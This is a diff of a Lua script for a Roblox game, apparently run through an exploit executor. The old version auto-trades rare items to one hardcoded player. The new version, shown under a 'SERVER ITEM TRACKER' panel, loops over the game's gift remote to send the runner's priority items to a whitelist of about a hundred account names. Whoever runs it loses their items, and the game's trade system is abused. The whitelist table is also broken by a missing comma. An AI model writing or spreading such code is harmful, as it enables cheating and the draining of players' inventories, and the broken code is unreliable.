@@ -1,194 +1,300 @@
-task.wait(5)
--- --- KONFIGURASI GLOBAL ---
-getgenv().AutoTradeGalactio = false  
-_G.AutoTradeEnabled = false 
-getgenv().nickname = "AkbarSiRaja_283"
-
-local player = game.Players.LocalPlayer
-local coreGui = game:GetService("CoreGui")
-local VIM = game:GetService("VirtualInputManager")
-local UIS = game:GetService("UserInputService")
-local lp = player
-
--- --- 1. FUNCTION: UNEQUIP ---
-local function unequipAll()
-    if lp.Character then
-        local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")
-        if humanoid then humanoid:UnequipTools() end
-    end
-end
-
--- --- 2. FUNCTION: HITUNG ITEM (DIJAMIN AKURAT) ---
-local function getInventoryData()
-    local adminItems = {}
-    local backpack = player.Backpack:GetChildren()
-    local character = player.Character and player.Character:GetChildren() or {}
+task.wait(10)
+-- // SISTEM WHITELIST // --
+local WHITELIST_PLAYERS = {
+    "XxEch0_F0xxX2010", "CosmicViolet107382", "MagicBluebell51346", 
+    "CosmicLeo821578", "DreamyFlora117266", "SoftGrace791107", 
+    "SunnyLuna413619", "BrightZoe16605", "MysticPoppy368901", 
+    "DreamyNoah125339", "LunarEmma509699", "ElegantTulip188651", 
+    "SoftAmber535081", "VelvetLotus139079", "SereneAlice178060", 
+    "MysticPeony545799", "BrightLuna464045", "FreshCamellia977829", 
+    "RadiantIris841469", "VelvetJade628489", "MysticTulip891841", 
+    "VelvetLucas24422", "SereneAmber939308", "R0gueHer0Master24", 
+    "VelvetMagnolia623037",
     
-    for _, item in pairs(backpack) do
-        if item:IsA("Tool") and item:GetAttribute("BrainrotName") == "Galactio Fantasma" and item:GetAttribute("Mutation") == "Admin" then
-            table.insert(adminItems, item)
+    -- Username Baru Ditambahkan:
+    "AntonioRobinson3040", "SueDoyle6", "SavannahPatterson0", "GardenClark0", 
+    "CarlaPearson40516", "MeganHays4838", "PrestonBecker47", "CowBruce406", 
+    "CoryChaney4002", "KristieSchultz09873", "KaitlynPearl27000", "AngelicaPhelps491", 
+    "StacieNixon9", "CarolCantrell99332", "MonicaHaas8", "MiguelWood40773", 
+    "CoreyLucas722", "TonyYellow4183", "RosePerez8321", "TaylorEdwards02869", 
+    "StephanieFry295"
+
+    "ChelseyHahn14", "ShannonMurillo00", "XavierBailey1147", 
+    "CraigJordan00", "BunnyBarber29", "KeithBurnett5560", "TerrySerrano6452", 
+    "AustinCervantes104", "DuckCampos7", "ToniHernandez1229", "KittyMiddleton6", 
+    "AprilKey4410", "BiancaWheat4942", "VictorGould4", "JayHickman129", 
+    "CarolynAdams66094", "DorothyWood330", "CheyenneWoods35", "KristaPotts4340", 
+    "AnthonyGuerrero683", "CactiNicholson2", "TreeBartlett18", "TannerBarr90170", 
+    "JesseCollins18517", "DorothyFarley4524", "NancyDean7471", "RobertoWaters9980", 
+    "AliciaGolden3773", "BelindaWelch3367", "CharlesTearose18", "PerryHayes07", 
+    "PamMathis452", "RebekahConley1", "KatrinaMadden9", "SaraHutchinson4552", 
+    "VioletPayne4", "AnaBlackwell599", "WarrenCarlson471", "NoahNorman63", 
+    "CactiMosley5", "SharonFlowers1775", "TeresaZavala26", "PineSeashell422", 
+    "LydiaRoberts740", "CactiHuynh07", "GlennBright967", "DanaPruitt21", 
+    "ShelbyRuiz01628", "HaroldGross9", "SteveStark5431", "GabrielaDecker49122", 
+    "DarrenGaines553", "CarolRasmussen11629", "JonathanEsparza422", 
+    "AntonioAlvarez9106", "MariahCoffey31", "LauraUmber56", "DouglasSpencer34176", 
+    "ZacharyGallagher154", "BrittneyBrandt3"
+}
+
+-- // PENGATURAN ITEM // --
+local MIN_LEVEL = 1 -- Batas level minimal
+local PRIORITY_LIST = {"Rubichetto", "Freezeti", "Galactio", "Glacierello", "Strawberry", "Din", "Burgerini", "Bulbito"} -- Item yang dipantau
+local MUTATION_PRIORITY = {"Gamer", "Lucky", "Money", "UFO", "Radioactive", "Emerald", "Gold", "Blood"} -- Muatasi ini diprioritaskan, tapi mutasi lain tetap dikirim
+local KEYWORD_BAT = "Bat"
+local MAX_ITEM_LIMIT = 100
+local KEEP_MINIMUM = 2 -- Batas item yang disisakan di inventory
+
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+
+-- // FUNGSI CEK WHITELIST // --
+local function isWhitelisted(playerName)
+    for _, name in ipairs(WHITELIST_PLAYERS) do
+        if playerName == name then
+            return true
         end
     end
-    
-    for _, item in pairs(character) do
-        if item:IsA("Tool") and item:GetAttribute("BrainrotName") == "Galactio Fantasma" and item:GetAttribute("Mutation") == "Admin" then
-            table.insert(adminItems, item)
-        end
-    end
-    
-    return adminItems
+    return false
 end
 
--- --- 3. MAIN TRADE LOGIC (ULTRA SAFETY) ---
-task.spawn(function()
-    while task.wait(0.8) do -- Jeda sedikit lebih lama agar server tidak rate-limit
-        if getgenv().AutoTradeGalactio then
-            local currentItems = getInventoryData()
-            
-            -- PROTEKSI TOTAL: Jika sisa 1 atau kurang, langsung MATIKAN fungsi.
-            if #currentItems <= 1 then
-                getgenv().AutoTradeGalactio = false
-                unequipAll()
-                warn("SAFETY TRIGGERED: Hanya tersisa 1 item. Sistem dimatikan.")
-                continue
-            end
+-- // UI SETUP // --
+local screenGui = Instance.new("ScreenGui", lp:WaitForChild("PlayerGui"))
+screenGui.Name = "GiftTrackerSuite"
+screenGui.ResetOnSpawn = false
 
-            -- CEK TARGET
-            local targetPlr = game.Players:FindFirstChild(getgenv().nickname)
-            if not targetPlr or not targetPlr.Character or not targetPlr.Character:FindFirstChild("HumanoidRootPart") then
-                continue 
-            end
+local containerFrame = Instance.new("Frame", screenGui)
+containerFrame.Size = UDim2.new(0, 200, 0, 250)
+containerFrame.Position = UDim2.new(1, -220, 0.5, -125)
+containerFrame.BackgroundTransparency = 1
+containerFrame.Active = true
 
-            -- AMBIL ITEM (Selalu sisakan satu, ambil yang index terakhir)
-            local itemToSend = currentItems[#currentItems] 
-            
-            if itemToSend and itemToSend.Parent then
-                local hum = player.Character:FindFirstChildOfClass("Humanoid")
-                if hum then
-                    -- Equip dan tunggu sebentar
-                    hum:EquipTool(itemToSend)
-                    task.wait(0.4) 
-                    
-                    -- VERIFIKASI ULANG SETELAH EQUIP
-                    local finalCheck = getInventoryData()
-                    if #finalCheck > 1 then
-                        local prompt = targetPlr.Character.HumanoidRootPart:FindFirstChild("TradePrompt")
-                        if prompt then 
-                            fireproximityprompt(prompt) 
+local listFrame = Instance.new("Frame", containerFrame)
+listFrame.Size = UDim2.new(1, 0, 0, 150)
+listFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+listFrame.BackgroundTransparency = 0.3
+Instance.new("UICorner", listFrame).CornerRadius = UDim.new(0, 10)
+
+local listTitle = Instance.new("TextLabel", listFrame)
+listTitle.Size = UDim2.new(1, 0, 0, 25)
+listTitle.Text = "SERVER ITEM TRACKER"
+listTitle.TextColor3 = Color3.fromRGB(255, 255, 0)
+listTitle.Font = Enum.Font.SourceSansBold
+listTitle.TextSize = 14
+listTitle.BackgroundTransparency = 1
+
+local watermarkLabel = Instance.new("TextLabel", listFrame)
+watermarkLabel.Size = UDim2.new(1, 0, 0, 20)
+watermarkLabel.Position = UDim2.new(0, 0, 0.5, -10)
+watermarkLabel.BackgroundTransparency = 1
+watermarkLabel.Text = "Made by pohonk (DC) / Macabre (FB)"
+watermarkLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+watermarkLabel.TextTransparency = 0.7
+watermarkLabel.Font = Enum.Font.SourceSansItalic
+watermarkLabel.TextSize = 10
+watermarkLabel.ZIndex = 2
+
+local scrollContainer = Instance.new("ScrollingFrame", listFrame)
+scrollContainer.Size = UDim2.new(1, -10, 1, -35)
+scrollContainer.Position = UDim2.new(0, 5, 0, 30)
+scrollContainer.BackgroundTransparency = 1
+scrollContainer.ScrollBarThickness = 2
+scrollContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
+Instance.new("UIListLayout", scrollContainer).Padding = UDim.new(0, 2)
+
+local mainFrame = Instance.new("Frame", containerFrame)
+mainFrame.Size = UDim2.new(1, 0, 0, 70)
+mainFrame.Position = UDim2.new(0, 0, 0, 155)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)
+
+local statusLabel = Instance.new("TextLabel", mainFrame)
+statusLabel.Size = UDim2.new(1, -20, 1, -10)
+statusLabel.Position = UDim2.new(0, 10, 0, 5)
+statusLabel.BackgroundTransparency = 1
+statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+statusLabel.Font = Enum.Font.SourceSansBold
+statusLabel.TextSize = 13
+statusLabel.TextWrapped = true
+statusLabel.Text = "Mencari Target Whitelist..."
+
+-- // DRAGGABLE UI // --
+local dragging, dragInput, dragStart, startPos
+local function update(input)
+    local delta = input.Position - dragStart
+    containerFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+containerFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true dragStart = input.Position startPos = containerFrame.Position
+        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
+    end
+end)
+containerFrame.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end end)
+UserInputService.InputChanged:Connect(function(input) if input == dragInput and dragging then update(input) end end)
+
+-- // LOGIKA ITEM // --
+local function getInventoryCount(targetPlayer)
+    local count = 0
+    if not targetPlayer or not targetPlayer.Parent then return 0 end
+    local function check(c)
+        if not c then return end
+        for _, i in ipairs(c:GetChildren()) do if i:IsA("Tool") and not string.find(string.lower(i.Name), "bat") then count = count + 1 end end
+    end
+    check(targetPlayer:FindFirstChild("Backpack"))
+    check(targetPlayer.Character)
+    return count
+end
+
+local function getAllMatchingTools(keyword)
+    local search = string.lower(keyword)
+    local found = {}
+    local all = lp.Backpack:GetChildren()
+    if lp.Character then for _, v in ipairs(lp.Character:GetChildren()) do if v:IsA("Tool") then table.insert(all, v) end end end
+    
+    for _, tool in ipairs(all) do
+        local isMatch = false
+        local itemLevel = tool:GetAttribute("Level") or (tool:FindFirstChild("Level") and tool.Level.Value) or 0
+        
+        if itemLevel >= MIN_LEVEL then
+            pcall(function()
+                if string.find(string.lower(tool.Name), search) then 
+                    isMatch = true
+                else
+                    for _, desc in ipairs(tool:GetDescendants()) do
+                        if desc:IsA("StringValue") and string.find(string.lower(desc.Value), search) then 
+                            isMatch = true break 
+                        end 
+                    end
+                    if not isMatch then
+                        local attrs = tool:GetAttributes()
+                        for _, val in pairs(attrs) do 
+                            if type(val) == "string" and string.find(string.lower(val), search) then
+                                isMatch = true break 
+                            end 
                         end
-                    else
-                        -- Jika tiba-tiba sisa 1 saat mau kirim, batalkan!
-                        unequipAll()
-                        getgenv().AutoTradeGalactio = false
+                    end
+                end
+            end)
+        end
+        if isMatch and tool.Parent ~= nil then table.insert(found, tool) end
+    end
+    return found
+end
+
+local function getTotalPriorityItemsOwned()
+    local total = 0
+    for _, keyword in ipairs(PRIORITY_LIST) do
+        total = total + #getAllMatchingTools(keyword)
+    end
+    return total
+end
+
+local function getLowPriorityTool()
+    for i = #PRIORITY_LIST, 1, -1 do
+        local itemKeyword = PRIORITY_LIST[i]
+        local tools = getAllMatchingTools(itemKeyword)
+        if #tools > 0 then
+            -- Cari mutasi prioritas dulu
+            for _, mutKeyword in ipairs(MUTATION_PRIORITY) do
+                for _, tool in ipairs(tools) do
+                    local mutation = tool:GetAttribute("Mutation")
+                    if not mutation then
+                        for _, v in ipairs(tool:GetDescendants()) do
+                            if v:IsA("StringValue") and (v.Name == "Mutation" or string.find(string.lower(v.Value), string.lower(mutKeyword))) then
+                                mutation = v.Value
+                                break
+                            end
+                        end
+                    end
+                    if mutation and string.find(string.lower(mutation), string.lower(mutKeyword)) then 
+                        return tool, itemKeyword, mutation
                     end
                 end
             end
+            
+            -- Jika tidak ada mutasi prioritas, kirim mutasi apa saja
+            local tool = tools[1]
+            local mutation = tool:GetAttribute("Mutation") or "Normal/Any"
+            return tool, itemKeyword, mutation
         end
     end
-end)
-
--- --- 4. AUTO ACCEPT LOOP ---
-task.spawn(function()
-    while task.wait(0.5) do
-        if _G.AutoTradeEnabled then
-            local requestUI = lp.PlayerGui:FindFirstChild("TradeRequest")
-            if requestUI then
-                local viewport = workspace.CurrentCamera.ViewportSize
-                VIM:SendMouseButtonEvent(viewport.X * 0.43, viewport.Y * 0.62, 0, true, game, 0)
-                task.wait(0.05)
-                VIM:SendMouseButtonEvent(viewport.X * 0.43, viewport.Y * 0.62, 0, false, game, 0)
-                task.wait(0.2)
-                unequipAll()
-            end
-        end
-    end
-end)
-
--- --- UI SETUP ---
-if coreGui:FindFirstChild("GalactioFinalV4") then coreGui.GalactioFinalV4:Destroy() end
-local screenGui = Instance.new("ScreenGui", coreGui)
-screenGui.Name = "GalactioFinalV4"
-
-local mainFrame = Instance.new("Frame", screenGui)
-mainFrame.Size = UDim2.new(0, 240, 0, 300)
-mainFrame.Position = UDim2.new(0.5, -120, 0.3, 0)
-mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-mainFrame.Active, mainFrame.Draggable = true, true
-Instance.new("UICorner", mainFrame)
-
-local layout = Instance.new("UIListLayout", mainFrame)
-layout.Padding = UDim.new(0, 6)
-layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-
-local title = Instance.new("TextLabel", mainFrame)
-title.Size = UDim2.new(1, 0, 0, 40)
-title.Text = "PHONK ONTOP"
-title.TextColor3 = Color3.new(1, 1, 1)
-title.Font = Enum.Font.GothamBold
-title.BackgroundTransparency = 1
-
-local function createBtn(txt, varName, isGlobal, customColor)
-    local btn = Instance.new("TextButton", mainFrame)
-    btn.Size = UDim2.new(0.9, 0, 0, 35)
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 10
-    Instance.new("UICorner", btn)
-
-    task.spawn(function()
-        while task.wait(0.2) do
-            local val = isGlobal and _G[varName] or getgenv()[varName]
-            btn.Text = txt .. ": " .. (val and "ON" or "OFF")
-            btn.BackgroundColor3 = val and (customColor or Color3.fromRGB(50, 200, 50)) or Color3.fromRGB(40, 40, 40)
-        end
-    end)
-
-    btn.MouseButton1Click:Connect(function()
-        if isGlobal then
-            _G[varName] = not _G[varName]
-        else
-            if not getgenv()[varName] then -- Mau nyalain
-                task.wait(2)
-                if #getInventoryData() <= 1 then warn("Safety: Only 1 left!") return end
-            end
-            getgenv()[varName] = not getgenv()[varName]
-        end
-    end)
+    return nil, nil, nil
 end
 
-createBtn("SEND (R)", "AutoTradeGalactio", false, Color3.fromRGB(138, 43, 226))
-createBtn("AUTO ACCEPT (Q)", "AutoTradeEnabled", true, Color3.fromRGB(0, 150, 255))
-
-local userBox = Instance.new("TextBox", mainFrame)
-userBox.Size = UDim2.new(0.9, 0, 0, 35)
-userBox.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-userBox.TextColor3 = Color3.new(1, 1, 1)
-userBox.Text = getgenv().nickname
-userBox.PlaceholderText = "Target Nickname..."
-Instance.new("UICorner", userBox)
-userBox.FocusLost:Connect(function() getgenv().nickname = userBox.Text end)
-
-local footer = Instance.new("TextLabel", mainFrame)
-footer.Size = UDim2.new(1, 0, 0, 70)
-footer.Text = "R: Send (Safety 2s) | Q: Accept\nJ: Hide UI\nStatus: Always leaves 1 item\nTarget: AkbarSiRaja_283"
-footer.TextColor3 = Color3.fromRGB(150, 150, 150)
-footer.BackgroundTransparency = 1
-footer.TextSize = 8
-
--- --- KEYBIND HANDLER ---
-UIS.InputBegan:Connect(function(input, processed)
-    if processed then return end 
-    
-    if input.KeyCode == Enum.KeyCode.R then
-        if not getgenv().AutoTradeGalactio then
-            task.wait(2) -- Delay pengecekan sesuai request
-            if #getInventoryData() <= 1 then return end
+local function getNextTarget()
+    local allPlayers = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= lp and isWhitelisted(p.Name) and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+            if getInventoryCount(p) < MAX_ITEM_LIMIT then table.insert(allPlayers, p) end
         end
-        getgenv().AutoTradeGalactio = not getgenv().AutoTradeGalactio
+    end
+    if #allPlayers == 0 then return nil end
+    table.sort(allPlayers, function(a, b) return getInventoryCount(a) < getInventoryCount(b) end)
+    return allPlayers[1]
+end
+
+-- // LOOP UTAMA // --
+task.spawn(function()
+    while true do
+        local totalPriorityOwned = getTotalPriorityItemsOwned()
+        local targetPlayer = getNextTarget()
+        local giftTool, itemKeyword, mutation = getLowPriorityTool()
         
-    elseif input.KeyCode == Enum.KeyCode.Q then
-        _G.AutoTradeEnabled = not _G.AutoTradeEnabled
-        
-    elseif input.KeyCode == Enum.KeyCode.J then
-        mainFrame.Visible = not mainFrame.Visible
+        -- Hanya kirim jika total item lebih dari 2
+        if giftTool and targetPlayer and totalPriorityOwned > KEEP_MINIMUM then
+            statusLabel.Text = "Target: " .. targetPlayer.Name .. " [" .. mutation .. " " .. itemKeyword .. "]"
+            local batTool = getAllMatchingTools(KEYWORD_BAT)[1]
+            if batTool then pcall(function() lp.Character.Humanoid:EquipTool(batTool) end) end
+            
+            task.wait(1)
+            if giftTool and giftTool.Parent then
+                statusLabel.Text = "Kirim Mutasi: " .. mutation
+                pcall(function() lp.Character.Humanoid:EquipTool(giftTool) end)
+                
+                task.wait(1.2)
+    
+                local remote = ReplicatedStorage.Packages.Net["RF/Trade.SendGift"]
+                repeat 
+                    task.spawn(function() pcall(function() remote:InvokeServer(targetPlayer) end) end)
+                    task.wait(0.7)
+                until not giftTool or giftTool.Parent ~= lp.Character or getTotalPriorityItemsOwned() <= KEEP_MINIMUM
+    
+                statusLabel.Text = "Verifikasi..."
+                task.wait(8)
+            end
+        elseif totalPriorityOwned <= KEEP_MINIMUM then
+            statusLabel.Text = "Sisa " .. KEEP_MINIMUM .. " item. Pengiriman berhenti."
+            task.wait(5)
+        else
+            statusLabel.Text = "Status: Mencari Mutasi/Target..."
+            task.wait(2)
+        end
+        task.wait(1)
+    end
+end)
+
+-- // UI REFRESH // --
+task.spawn(function()
+    while true do
+        for _, child in ipairs(scrollContainer:GetChildren()) do if child:IsA("TextLabel") then child:Destroy() end end
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= lp then
+                local count = getInventoryCount(p)
+                local pLabel = Instance.new("TextLabel", scrollContainer)
+                pLabel.Size = UDim2.new(1, 0, 0, 18)
+                pLabel.BackgroundTransparency = 1
+                pLabel.TextColor3 = (count >= MAX_ITEM_LIMIT) and Color3.new(1,0,0) or Color3.new(1,1,1)
+                pLabel.Text = " " .. p.Name .. ": " .. count .. "/100"
+                pLabel.TextSize = 11
+                pLabel.Font = Enum.Font.SourceSans
+                pLabel.TextXAlignment = Enum.TextXAlignment.Left
+            end
+        end
+        scrollContainer.CanvasSize = UDim2.new(0, 0, 0, scrollContainer.UIListLayout.AbsoluteContentSize.Y)
+        task.wait(2)
     end
 end)
